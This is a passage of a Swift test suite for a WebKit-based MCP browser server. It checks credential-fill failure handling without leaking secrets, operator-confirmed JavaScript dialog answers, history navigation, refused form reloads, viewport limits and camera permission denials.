      baseURL: URL(string: "https://fixture.invalid/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      presentHumanWindows: false,
      credentialBroker: FixedStatusCredentialBrokerStub(status: .credentialNotFound),
      confirmationPresenter: ConfirmationPresenterStub(responses: [true])
    )
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server,
      id: 2,
      name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "username_element_id": .string("e1"),
        "password_element_id": .string("e2"),
      ]
    )
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(result["status"] == .string("credential_not_found"))
    #expect(result["add_offered"] == .bool(true))
    #expect(result["human_handoff_started"] == .bool(true))
    #expect(result["control_state"] == .string("human_controlled"))
    let fieldValues =
      try await runtime.webView.evaluateJavaScript(
        "JSON.stringify([username.value,password.value])") as? String
    #expect(fieldValues == "[\"\",\"\"]")
  }

  @Test("Unavailable Mac user presence returns explicit retry guidance")
  func siliconPassUserPresenceUnavailable() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <form>
        <input id='username' autocomplete='username'>
        <input id='password' type='password' autocomplete='current-password'>
      </form>
      """,
      baseURL: URL(string: "https://fixture.invalid/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: FixedStatusCredentialBrokerStub(status: .userPresenceUnavailable)
    )
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server,
      id: 2,
      name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "username_element_id": .string("e1"),
        "password_element_id": .string("e2"),
      ]
    )
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(result["status"] == .string("user_presence_unavailable"))
    #expect(result["requires_user_presence"] == .bool(true))
    #expect(result["retryable"] == .bool(true))
    #expect(result["automatic_retry"] == .bool(false))
    #expect(result["secret_released"] == .bool(false))
    #expect(result["authentication_policy"] == .string("device_owner_authentication"))
    #expect(
      result["accepted_methods"]
        == .array([
          .string("system_device_owner_authentication")
        ]))
    #expect(
      result["recovery"]
        == .string(
          "Unlock this Mac and retry from an interactive session using the authentication method offered by macOS. Closed-lid availability is device-specific and is not inferred."
        ))
  }

  @Test(
    "Credential failures preserve safe recovery categories without leaking errors",
    arguments: ["unavailable", "timeout", "invalid", "unexpected", "provider"])
  func siliconPassFailureRecovery(_ failure: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<input id='u' autocomplete='username'><input id='p' type='password' autocomplete='current-password'>",
      baseURL: URL(string: "https://fixture.invalid/login"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let error: Error?
    let expectedCode: String
    switch failure {
    case "unavailable":
      error = CredentialBrokerClientError.transport(stage: .request, code: .unavailable)
      expectedCode = "unavailable"
    case "timeout":
      error = CredentialBrokerClientError.transport(stage: .delivery, code: .timedOut)
      expectedCode = "timed_out"
    case "invalid":
      error = CredentialBrokerClientError.transport(stage: .delivery, code: .invalidReply)
      expectedCode = "invalid_reply"
    case "provider":
      error = nil
      expectedCode = "provider_failed"
    default:
      error = NSError(
        domain: "private-error-canary", code: 7,
        userInfo: [NSLocalizedDescriptionKey: "private-error-canary"])
      expectedCode = "unexpected_failure"
    }
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: FixedStatusCredentialBrokerStub(status: .failed, error: error))
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "username_element_id": .string("e1"), "password_element_id": .string("e2"),
      ])
    let result = try object(try object(response["result"])["structuredContent"])
    #expect(try object(response["result"])["isError"] == .bool(true))
    #expect(result["code"] == .string("credential_broker_" + expectedCode))
    #expect(try string(result["recovery"]).contains("operation=handoff_start"))
    #expect(result["requires_human_handoff"] == .bool(true))
    #expect(result["automatic_retry"] == .bool(false))
    #expect(result["retryable"] == .bool(false))
    #expect(result["secret_released_to_mcp"] == .bool(false))
    #expect(
      result["sink_delivery_state"] == .string(failure == "unavailable" ? "not_started" : "unknown")
    )
    #expect(
      !String(decoding: try JSONEncoder().encode(response), as: UTF8.self).contains(
        "private-error-canary"))
    #expect(
      try await runtime.webView.evaluateJavaScript("JSON.stringify([u.value,p.value])") as? String
        == "[\"\",\"\"]")
  }

  @Test("Malformed requests and tool arguments fail at the right boundary")
  func failures() async throws {
    let server = try WebKitMCPServer()
    let parse = try decode(await server.handle(Data("not-json".utf8)))
    #expect(try object(parse["error"])["code"] == .int(-32700))

    let invalid = try await call(
      server,
      id: 1,
      method: "tools/call",
      params: .object([
        "name": .string("browser_session"),
        "arguments": .object([
          "operation": .string("status"), "session_id": .string("not-a-uuid"),
        ]),
      ]),
      modern: true
    )
    #expect(try object(invalid["error"])["code"] == .int(-32602))
  }

  private func toolCall(
    _ server: WebKitMCPServer,
    id: Int64,
    name: String,
    arguments: [String: JSONValue]
  ) async throws -> [String: JSONValue] {
    try await call(
      server,
      id: id,
      method: "tools/call",
      params: .object([
        "name": .string(name),
        "arguments": .object(arguments),
      ]),
      modern: true
    )
  }

  private func legacyToolCall(
    _ server: WebKitMCPServer,
    id: Int64,
    name: String,
    arguments: [String: JSONValue]
  ) async throws -> [String: JSONValue] {
    try await call(
      server,
      id: id,
      method: "tools/call",
      params: .object([
        "name": .string(name),
        "arguments": .object(arguments),
      ]),
      modern: false
    )
  }

  private func roundTripToolCall(
    _ server: WebKitMCPServer,
    id: Int64,
    name: String,
    arguments: [String: JSONValue],
    requestState: String,
    action: String,
    confirm: Bool?
  ) async throws -> [String: JSONValue] {
    var response: [String: JSONValue] = ["action": .string(action)]
    if let confirm { response["content"] = .object(["confirm": .bool(confirm)]) }
    return try await call(
      server,
      id: id,
      method: "tools/call",
      params: .object([
        "name": .string(name),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object(["confirmation": .object(response)]),
      ]),
      modern: true
    )
  }

  private func call(
    _ server: WebKitMCPServer,
    id: Int64,
    method: String,
    params: JSONValue,
    modern: Bool
  ) async throws -> [String: JSONValue] {
    var request: [String: JSONValue] = [
      "jsonrpc": .string("2.0"),
      "id": .int(id),
      "method": .string(method),
      "params": params,
    ]
    if modern {
      var parameterObject = try object(request["params"])
      parameterObject["_meta"] = .object([
        "io.modelcontextprotocol/protocolVersion": .string("2026-07-28"),
        "io.modelcontextprotocol/clientInfo": .object([
          "name": .string("tests"), "version": .string("1"),
        ]),
        "io.modelcontextprotocol/clientCapabilities": .object([
          "elicitation": .object([:])
        ]),
      ])
      request["params"] = .object(parameterObject)
    }
    let data = try JSONEncoder().encode(JSONValue.object(request))
    return try decode(await server.handle(data))
  }

  private func rawCall(
    _ server: WebKitMCPServer,
    id: Int64,
    method: String,
    params: JSONValue
  ) async throws -> [String: JSONValue] {
    let request: JSONValue = .object([
      "jsonrpc": .string("2.0"),
      "id": .int(id),
      "method": .string(method),
      "params": params,
    ])
    return try decode(await server.handle(try JSONEncoder().encode(request)))
  }

  private func decode(_ data: Data?) throws -> [String: JSONValue] {
    guard let data else { throw TestError.missingResponse }
    return try object(try JSONDecoder().decode(JSONValue.self, from: data))
  }

  private func object(_ value: JSONValue?) throws -> [String: JSONValue] {
    guard case .object(let object) = value else { throw TestError.wrongType }
    return object
  }

  private func array(_ value: JSONValue?) throws -> [JSONValue] {
    guard case .array(let array) = value else { throw TestError.wrongType }
    return array
  }

  private func string(_ value: JSONValue?) throws -> String {
    guard case .string(let string) = value else { throw TestError.wrongType }
    return string
  }

  /// Resolves the observed control carrying an exact accessible name, so a fixture's
  /// heading never stands in for its file input.
  private func fileControlID(
    in observation: [String: JSONValue], labelled label: String
  ) throws -> String {
    try elementID(in: observation, named: label)
  }

  /// The observed element whose accessible name is exactly this. Addressing a fixture by
  /// position breaks the moment the fixture grows a second control.
  private func elementID(
    in observation: [String: JSONValue], named label: String
  ) throws -> String {
    for element in try array(observation["elements"]) {
      let fields = try object(element)
      guard let name = fields["accessibleName"],
        case .object(let provenanced) = name,
        let segments = provenanced["segments"],
        case .array(let parts) = segments
      else { continue }
      let text = try parts.map { try string(object($0)["text"]) }.joined()
      if text == label { return try string(fields["elementID"]) }
    }
    throw TestError.wrongType
  }

  /// The whole observed element, not just its ID, for a test that reads the payload a
  /// client reads rather than reaching past it into the runtime.
  private func element(
    in observation: [String: JSONValue], named label: String
  ) throws -> [String: JSONValue] {
    let wanted = try elementID(in: observation, named: label)
    for element in try array(observation["elements"]) {
      let fields = try object(element)
      if try string(fields["elementID"]) == wanted { return fields }
    }
    throw TestError.wrongType
  }

  /// A provenanced string as a client reads it: the segments joined, nothing else.
  private func provenancedText(_ value: JSONValue?) throws -> String {
    try array(object(value)["segments"]).map { try string(object($0)["text"]) }.joined()
  }

  private func optionLabels(of element: [String: JSONValue]) throws -> [String] {
    try array(element["options"]).map { try provenancedText(object($0)["label"]) }
  }

  /// Loads a page that is ready, then makes it wait on one JavaScript panel opened from
  /// a timer. The panel cannot be opened from the awaited script itself: `confirm()` and
  /// `prompt()` suspend the page inside the call.
  private func sessionWaitingOnJavaScriptDialog(
    _ script: String,
    responses: [Bool]
  ) async throws -> (
    handle: WebKitSessionHandle, runtime: WebKitRuntime, server: WebKitMCPServer,
    presenter: ConfirmationPresenterStub, dialogID: String
  ) {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<title>Invoices</title><p>ready</p>", baseURL: URL(string: "https://example.test/invoices"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: responses)
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    _ = try await runtime.webView.evaluateJavaScript(script)
    let dialogID = try #require(
      await awaitPendingDialogID(on: runtime), "no JavaScript dialog was ever reported")
    return (handle, runtime, server, presenter, dialogID)
  }

  @Test("A confirmed dialog accept makes the page's own confirm() return true")
  func confirmedJavaScriptDialogAccept() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = confirm('Delete invoice 1471?') }, 0)",
      responses: [true])

    let answered = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_accept"),
        "dialog_id": .string(session.dialogID),
        "idempotency_key": .string("dialog-accept-once"),
      ])
    let structured = try object(try object(answered["result"])["structuredContent"])
    #expect(structured["dialog_outcome"] == .string("accepted"))
    #expect(structured["dialog_kind"] == .string("confirm"))
    #expect(session.presenter.requests.count == 1, "the native dialog was never asked for")
    #expect(session.presenter.requests[0].message.contains("Delete invoice 1471?"))

    #expect(await awaitPageDialogAnswer(on: session.runtime) as? Bool == true)
    #expect(session.runtime.pendingJavaScriptDialog() == nil)
  }

  @Test("A confirmed dialog dismiss makes the page's own confirm() return false")
  func confirmedJavaScriptDialogDismiss() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = confirm('Delete invoice 1471?') }, 0)",
      responses: [true])

    let answered = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_dismiss"),
        "dialog_id": .string(session.dialogID),
        "idempotency_key": .string("dialog-dismiss-once"),
      ])
    let structured = try object(try object(answered["result"])["structuredContent"])
    #expect(structured["dialog_outcome"] == .string("dismissed"))
    #expect(await awaitPageDialogAnswer(on: session.runtime) as? Bool == false)
  }

  @Test("A confirmed prompt accept supplies the exact value the page reads back")
  func confirmedJavaScriptPromptAcceptsExactValue() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = prompt('New statement name', 'Untitled') }, 0)",
      responses: [true])
    #expect(
      session.runtime.pendingJavaScriptDialog()?.defaultText?.segments.map(\.text).joined()
        == "Untitled")

    let answered = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_accept_value"),
        "dialog_id": .string(session.dialogID),
        "value": .string("Q3 Statements"),
        "idempotency_key": .string("dialog-prompt-once"),
      ])
    let structured = try object(try object(answered["result"])["structuredContent"])
    #expect(structured["dialog_outcome"] == .string("accepted"))
    #expect(structured["dialog_kind"] == .string("prompt"))
    #expect(structured["dialog_value_supplied"] == .bool(true))
    // The operator has to read the exact string that will be handed to the site.
    #expect(session.presenter.requests[0].message.contains("Q3 Statements"))
    #expect(await awaitPageDialogAnswer(on: session.runtime) as? String == "Q3 Statements")
  }

  @Test("A declined dialog confirmation leaves the dialog pending and answers nothing")
  func declinedJavaScriptDialogConfirmationAnswersNothing() async throws {
    let session = try await sessionWaitingOnJavaScriptDialog(
      "setTimeout(() => { window.__answer = confirm('Delete invoice 1471?') }, 0)",
      responses: [false])

    let refused = try await toolCall(
      session.server, id: 1, name: "browser_act",
      arguments: [
        "session_id": .string(session.handle.rawValue.uuidString),
        "operation": .string("dialog_accept"),
        "dialog_id": .string(session.dialogID),
        "idempotency_key": .string("dialog-declined-once"),
      ])
    #expect(try object(refused["result"])["isError"] == .bool(true))
    let structured = try object(try object(refused["result"])["structuredContent"])
    #expect(structured["status"] == .string("declined_by_user"))
    // The panel is still the operator's to answer: a refusal must not become a Cancel.
    #expect(session.runtime.pendingJavaScriptDialog()?.dialogID == session.dialogID)
    #expect(session.runtime.latestJavaScriptDialogRecord() == nil)

    // Never leave a suspended page behind for whatever runs next.
    _ = try session.runtime.answerJavaScriptDialog(dialogID: session.dialogID, accept: false)
  }

  @Test("Going back confirms WebKit's exact previous history entry and expires the observation")
  func confirmedHistoryBackUsesWebKitDestination() async throws {
    let fixture = try HistoryFixtureServer()
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in
      WebKitRuntime(websiteDataStore: .nonPersistent())
    })
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.navigate(
      to: URL(string: "http://127.0.0.1:\(fixture.port)/first")!,
      timeout: .seconds(10), quietWindow: .milliseconds(40))
    _ = try await runtime.navigate(
      to: URL(string: "http://127.0.0.1:\(fixture.port)/second")!,
      timeout: .seconds(10), quietWindow: .milliseconds(40))
    #expect(runtime.webView.backForwardList.backItem?.url.path == "/first")
    let observation = try await runtime.observe()
    let target = try #require(observation.elements.first)
    let presenter = ConfirmationPresenterStub(responses: [true, true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("back"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let structured = try object(try object(response["result"])["structuredContent"])

    #expect(structured["historyOperation"] == .string("back"))
    #expect(structured["readiness_scope"] == .string("document_completion_and_mutation_quiescence"))
    #expect(structured["business_readiness"] == .string("not_verified"))
    #expect(structured["remote_persistence_verified"] == .bool(false))
    #expect(structured["observationInvalidated"] == .bool(true))
    #expect(runtime.webView.url?.path == "/first")
    #expect(presenter.requests.count == 1)
    if let request = presenter.requests.first {
      #expect(request.message.contains("http://127.0.0.1:\(fixture.port)/first"))
      #expect(!request.message.contains("/second\n\nDestination"))
    }
    #expect(throws: WebKitRuntimeError.staleObservation) {
      try runtime.locatorRecipe(
        observationID: observation.observationID, elementID: target.elementID)
    }

    let forward = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("forward"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let forwardStructured = try object(try object(forward["result"])["structuredContent"])
    #expect(forwardStructured["historyOperation"] == .string("forward"))
    #expect(runtime.webView.url?.path == "/second")
    #expect(presenter.requests.count == 2)
    if presenter.requests.count == 2 {
      #expect(
        presenter.requests[1].message.contains(
          "http://127.0.0.1:\(fixture.port)/second"))
    }

    let reload = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("reload"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let reloadStructured = try object(try object(reload["result"])["structuredContent"])
    #expect(reloadStructured["historyOperation"] == .string("reload"))
    #expect(runtime.webView.url?.path == "/second")
    #expect(presenter.requests.count == 3)
    if presenter.requests.count == 3 {
      #expect(
        presenter.requests[2].message.contains(
          "http://127.0.0.1:\(fixture.port)/second"))
    }
  }

  @Test("The session tool changes only a bounded CSS viewport and reports invalidation")
  func sessionViewportChangeIsBoundedAndExplicit() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Responsive</title><p>Ready</p>",
      baseURL: URL(string: "https://fixture.invalid/responsive"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(registry: registry)

    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("set_viewport"),
        "session_id": .string(handle.rawValue.uuidString),
        "width": .int(400),
        "height": .int(600),
      ])
    let structured = try object(try object(response["result"])["structuredContent"])

    #expect(structured["width"] == .int(400))
    #expect(structured["height"] == .int(600))
    #expect(structured["layoutChanged"] == .bool(true))
    #expect(structured["observationInvalidated"] == .bool(true))

    let invalid = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("set_viewport"),
        "session_id": .string(handle.rawValue.uuidString),
        "width": .int(319),
        "height": .int(600),
      ])
    #expect(try object(invalid["error"])["code"] == .int(-32602))
  }

  @Test("Back with no previous history entry is refused before confirmation")
  func backWithoutHistoryIsRefused() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Only page</title><p>One</p>",
      baseURL: URL(string: "https://fixture.invalid/only"),
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("back"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])

    #expect(result["isError"] == .bool(true))
    #expect(structured["status"] == .string("history_entry_unavailable"))
    #expect(structured["history_operation"] == .string("back"))
    #expect(structured["dispatched"] == .bool(false))
    #expect(presenter.requests.isEmpty)
  }

  @Test("Reload after a form response is refused with a replay-specific reason")
  func formResponseReloadIsRefusedBeforeConfirmation() async throws {
    let fixture = try HistoryFixtureServer()
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in
      WebKitRuntime(websiteDataStore: .nonPersistent())
    })
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.navigate(
      to: URL(string: "http://127.0.0.1:\(fixture.port)/form")!,
      timeout: .seconds(10), quietWindow: .milliseconds(40))
    _ = try await runtime.webView.evaluateJavaScript(
      "document.querySelector('form').requestSubmit()")
    for _ in 0..<500 where runtime.webView.url?.path != "/submitted" {
      try await Task.sleep(for: .milliseconds(20))
    }
    #expect(runtime.webView.url?.path == "/submitted")
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let response = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("reload"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])

    #expect(result["isError"] == .bool(true))
    #expect(structured["status"] == .string("reload_refused"))
    #expect(structured["reason"] == .string("current_page_resulted_from_form_submission"))
    #expect(structured["dispatched"] == .bool(false))
    #expect(presenter.requests.isEmpty)
  }

  @Test("A camera request is denied and the MCP observation records it")
  func cameraPermissionDenialIsPublished() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let capture = PermissionSecurityOriginCapture()
    let captureName = "permissionOrigin\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
    runtime.webView.configuration.userContentController.add(capture, name: captureName)
    defer {
      runtime.webView.configuration.userContentController.removeScriptMessageHandler(
        forName: captureName)
    }
    _ = try await runtime.loadHTML(
      "<title>Camera request</title><p>Ready</p>",
      baseURL: URL(string: "https://permissions.example/camera"),
      timeout: .seconds(10), quietWindow: .milliseconds(40))
    _ = try await runtime.webView.evaluateJavaScript(
      "window.webkit.messageHandlers['\(captureName)'].postMessage('origin'); true")
    let origin = try #require(capture.origin)
    var decision: WKPermissionDecision?
    #expect(
      runtime.responds(
        to: NSSelectorFromString(
          "webView:requestMediaCapturePermissionForOrigin:initiatedByFrame:type:decisionHandler:")))
    runtime.webView(
      runtime.webView,
      requestMediaCapturePermissionFor: origin,
      initiatedByFrame: PermissionStubFrameInfo.mainFrame,
      type: .camera
    ) { decision = $0 }
    #expect(decision == .deny)

    let server = WebKitMCPServer(registry: registry)
    let response = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "compact": .bool(true),
      ])
    let structured = try object(try object(response["result"])["structuredContent"])
    let denials = try array(structured["permission_denials"])
    #expect(denials.count == 1)
    let denial = try object(denials[0])
    #expect(denial["permission"] == .string("camera"))
    #expect(denial["origin"] == .string("https://permissions.example"))
    #expect(denial["frame_is_main"] == .bool(true))
    #expect(denial["request_count"] == .int(1))
  }

  private enum TestError: Error {
    case missingResponse
    case wrongType
  }
}
